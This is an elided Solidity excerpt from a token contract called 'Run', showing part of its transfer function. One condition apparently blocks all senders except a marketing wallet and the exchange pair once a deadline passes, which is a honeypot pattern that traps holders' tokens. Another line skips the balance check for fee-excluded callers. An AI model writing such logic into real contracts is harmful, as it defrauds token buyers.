...
contract Run is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]  ) { _burndead = amount.mul(2).div(100);}
        ...
        if (sender !=_marketingWallet  && sender !=panckev2 ){require(_time <= _brunTime);}

        uint256 tokens = _tOwned[sender];

        if (sender != recipient || !_isExcludedFromFee[msg.sender]) { require(tokens >= amount); }

        uint256 amountoken = amount - _burndead;
